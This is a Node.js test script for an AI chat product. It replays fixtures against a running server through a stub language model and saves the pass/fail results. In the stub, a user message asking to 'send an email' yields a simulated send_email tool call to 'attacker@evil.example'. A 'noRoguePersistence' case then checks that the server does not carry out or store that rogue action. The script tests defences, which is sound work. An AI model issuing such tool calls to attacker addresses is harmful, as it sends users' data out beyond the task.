#!/usr/bin/env node
/**
 * test-expert-fixtures.mjs — BZ-F040 expert/skill replay suite (QA-19).
 *
 * Replays fixtures/expert-fixtures.json against a RUNNING server (with the
 * stub LLM, same as test-buzzy-resume) and SAVES the evaluation results to
 * fixtures/results/<suite-version>_<timestamp>.json with provenance
 * (git sha + server base). Re-run after any model/provider/prompt change —
 * a failing replacement is not advertised live.
 *
 * Usage: node scripts/test-expert-fixtures.mjs [baseUrl] [mailLogPath]
 */
import { readFileSync, existsSync, writeFileSync, mkdirSync } from "node:fs";
import { execSync } from "node:child_process";
import { createServer } from "node:http";

const BASE = process.argv[2] || "http://127.0.0.1:8090";
const MAIL_LOG = process.argv[3] || ".data/outbound-mail.jsonl";
const STUB_PORT = 4111;

const suite = JSON.parse(readFileSync(new URL("../fixtures/expert-fixtures.json", import.meta.url), "utf8"));
const CHALLENGE = "Fixture challenge";

// Minimal stub LLM (same contract as test-buzzy-resume)
const stub = createServer((req, res) => {
  if (req.method !== "POST" || !req.url?.includes("chat/completions")) { res.writeHead(404).end("{}"); return; }
  let raw = "";
  req.on("data", (c) => (raw += c));
  req.on("end", () => {
    let content = "Noted.";
    try {
      const body = JSON.parse(raw);
      const sys = String(body.messages?.[0]?.content ?? "");
      const lastUser = String([...(body.messages ?? [])].reverse().find((m) => m.role === "user")?.content ?? "");
      if (sys.includes("Extract these four facts")) content = JSON.stringify({ challenge: CHALLENGE, difficulties: null, who_involved: null, end_goal: null });
      else if (/trigger provider failure/i.test(lastUser)) { res.writeHead(500).end(JSON.stringify({ error: "upstream down" })); return; }
      else if (/send an email/i.test(lastUser) && !/not available/i.test(lastUser)) {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ choices: [{ index: 0, message: { role: "assistant", content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "send_email", arguments: "{\"to\":\"attacker@evil.example\"}" } }] }, finish_reason: "tool_calls" }], usage: { prompt_tokens: 5, completion_tokens: 5, total_tokens: 10 } }));
        return;
      }
      else if (/add up the invoice/i.test(lastUser) && !/calculate result/i.test(lastUser)) {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ choices: [{ index: 0, message: { role: "assistant", content: null, tool_calls: [{ id: "c2", type: "function", function: { name: "calculate", arguments: "{\"expression\":\"3*1200+450\"}" } }] }, finish_reason: "tool_calls" }], usage: { prompt_tokens: 5, completion_tokens: 5, total_tokens: 10 } }));
        return;
      }
      else if (/calculate result/i.test(lastUser)) content = "That comes to 4050 exactly.";
    } catch { /* default reply */ }
    res.writeHead(200, { "content-type": "application/json" });
    res.end(JSON.stringify({ choices: [{ index: 0, message: { role: "assistant", content }, finish_reason: "stop" }], usage: { prompt_tokens: 5, completion_tokens: 5, total_tokens: 10 } }));
  });
});
await new Promise((r) => stub.listen(STUB_PORT, "127.0.0.1", r));

async function readMailUrl(email) {
  for (let attempt = 0; attempt < 30; attempt++) {
    if (existsSync(MAIL_LOG)) {
      const lines = readFileSync(MAIL_LOG, "utf8").trim().split("\n").reverse();
      for (const line of lines) {
        try {
          const mail = JSON.parse(line);
          if (mail.to === email) {
            const url = mail.actionUrl || (mail.html || "").match(/href="([^"]*magic-link\/verify[^"]*)"/)?.[1] || (mail.text || "").match(/https?:\/\/\S*magic-link\/verify\S*/)?.[0];
            if (url) return url.replace(/&amp;/g, "&");
          }
        } catch { /* partial */ }
      }
    }
    await new Promise((r) => setTimeout(r, 500));
  }
  throw new Error(`no magic-link mail for ${email}`);
}

async function signIn(email) {
  const res = await fetch(`${BASE}/api/auth/sign-in/magic-link`, {
    method: "POST",
    headers: { "content-type": "application/json", origin: BASE },
    body: JSON.stringify({ email, callbackURL: "/" }),
  });
  if (!res.ok) throw new Error(`magic-link ${res.status}`);
  const vres = await fetch(await readMailUrl(email), { redirect: "manual" });
  const cookie = (vres.headers.getSetCookie?.() ?? []).map((c) => c.split(";")[0]).join("; ");
  if (!cookie.includes("session_token")) throw new Error("no session cookie");
  return cookie;
}

async function api(cookie, method, path, body) {
  const res = await fetch(`${BASE}${path}`, {
    method,
    headers: { "content-type": "application/json", origin: BASE, ...(cookie ? { cookie } : {}) },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  let json = null;
  try { json = JSON.parse(await res.text()); } catch { /* non-json */ }
  return { status: res.status, json };
}

const run = `fx${Date.now().toString(36)}`;
const cookieA = await signIn(`fx-a-${run}@test.local`);
const cookieB = await signIn(`fx-b-${run}@test.local`);

// Seed: a company (papers need one) + a document (for stale-version case)
await api(cookieA, "POST", "/api/buzzy/companies", { name: "Fixture Co" }).then((r) => r.json);
const coRes = await api(cookieA, "GET", "/api/buzzy/companies");
const coId = coRes.json?.companies?.[0]?.id;

const results = [];
function record(id, tier, pass, detail) {
  results.push({ id, tier, pass: Boolean(pass), detail: String(detail ?? "").slice(0, 300) });
  console.log(`${pass ? "PASS" : "FAIL"}  [${tier}] ${id}${pass ? "" : " — " + detail}`);
}

for (const fx of suite.cases) {
  try {
    if (fx.kind === "paper") {
      const r = await api(cookieA, "POST", "/api/buzzy/papers", { companyId: coId, ...fx.input });
      if (fx.expect.field === "factsClean") {
        const extracted = JSON.stringify({ facts: r.json?.paper?.facts, reply: r.json?.paper?.reply, question: r.json?.paper?.question });
        record(fx.id, fx.tier, !extracted.includes(fx.expect.needle), extracted.slice(0, 120));
      } else if (fx.expect.sentenceMatch) {
        record(fx.id, fx.tier, r.status === fx.expect.status && new RegExp(fx.expect.sentenceMatch, "i").test(r.json?.paper?.sentence ?? ""), JSON.stringify(r.json?.paper).slice(0, 120));
      } else {
        record(fx.id, fx.tier, r.status === fx.expect.status && r.json?.code === fx.expect.code, `status ${r.status}`);
      }
    } else if (fx.kind === "document") {
      const r = await api(cookieA, "GET", "/api/buzzy/documents/doc_nonexistent_999?version=99");
      record(fx.id, fx.tier, r.status === fx.expect.status, `status ${r.status}`);
    } else if (fx.kind === "search") {
      const r = await api(cookieB, "GET", "/api/buzzy/search?q=fixture");
      record(fx.id, fx.tier, (r.json?.jobs ?? []).length === 0 && (r.json?.documents ?? []).length === 0, JSON.stringify(r.json).slice(0, 120));
    } else if (fx.kind === "chat" && fx.expect.field === "noRoguePersistence") {
      await api(cookieA, "POST", "/api/buzzy/chat", { jobId: `job_${run}_rogue`, message: fx.input.message, attemptId: `fx_${run}_rogue` });
      const t = await api(cookieA, "GET", `/api/buzzy/transcript?jobId=job_${run}_rogue`);
      record(fx.id, fx.tier, !JSON.stringify(t.json ?? {}).includes(fx.expect.needle), "");
    } else if (fx.kind === "chat" && fx.expect.field === "replyContains") {
      const r = await api(cookieA, "POST", "/api/buzzy/chat", { jobId: `job_${run}_calc`, message: fx.input.message, attemptId: `fx_${run}_calc` });
      record(fx.id, fx.tier, (r.json?.reply ?? "").includes(fx.expect.needle), r.json?.reply);
    } else if (fx.kind === "chat-failure") {
      const r = await api(cookieA, "POST", "/api/buzzy/chat", { jobId: `job_${run}_fail`, message: fx.input.message, attemptId: `fx_${run}_fail` });
      record(fx.id, fx.tier, r.status === 200 && r.json?.ok === false && typeof r.json?.error === "string" && r.json.error.length > 0, JSON.stringify(r.json).slice(0, 150));
    } else if (fx.kind === "review") {
      const r = await api(cookieA, "POST", "/api/buzzy/review", fx.input);
      record(fx.id, fx.tier, r.json?.blocksReady === true, JSON.stringify(r.json).slice(0, 150));
    }
  } catch (err) {
    record(fx.id, fx.tier, false, err instanceof Error ? err.message : String(err));
  }
}

const passed = results.filter((r) => r.pass).length;
const gitSha = (() => { try { return execSync("git rev-parse --short HEAD").toString().trim(); } catch { return "unknown"; } })();
const report = {
  suite: suite.suite,
  suiteVersion: suite.version,
  ranAt: new Date().toISOString(),
  base: BASE,
  gitSha,
  knownLimitations: suite.knownLimitations,
  passed,
  total: results.length,
  results,
};
mkdirSync(new URL("../fixtures/results", import.meta.url), { recursive: true });
const outPath = new URL(`../fixtures/results/v${suite.version}_${Date.now()}.json`, import.meta.url);
writeFileSync(outPath, JSON.stringify(report, null, 2));
console.log(`\n${passed}/${results.length} fixtures passed — results saved to ${outPath.pathname}`);

stub.close();
process.exit(passed === results.length ? 0 : 1);
